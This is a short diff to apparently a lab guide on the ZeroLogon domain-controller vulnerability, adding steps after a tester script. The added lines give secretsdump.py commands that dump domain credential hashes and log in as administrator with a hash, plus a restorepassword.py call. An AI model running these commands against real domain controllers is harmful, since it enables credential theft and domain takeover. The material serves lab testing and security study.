@@ -23,4 +23,8 @@ syntax from repository:
 $ ./zerologon_tester.py EXAMPLE-DC 1.2.3.4
 
 The DC name should be its NetBIOS computer name. If this name is not correct, the script will likely fail with a STATUS_INVALID_COMPUTER_NAME error."
-* 
+* If the DC is vulnerable, in a virtual lab environment run the ZeroLogon attack:
+syntax:
+$ secretsdump.py -just-dc <DOMAIN_NAME>/<DC_NAME>\&@<DC_IP_ADDRESS>
+$ secretsdump.py administrator@<DC_IP_ADDRESS> -hashes
+$ python3 restorepassword.py <DOMAIN_NAME>/<DC_NAME>@<DC_NAME> -target-ip <DC_IP_ADDRESS>
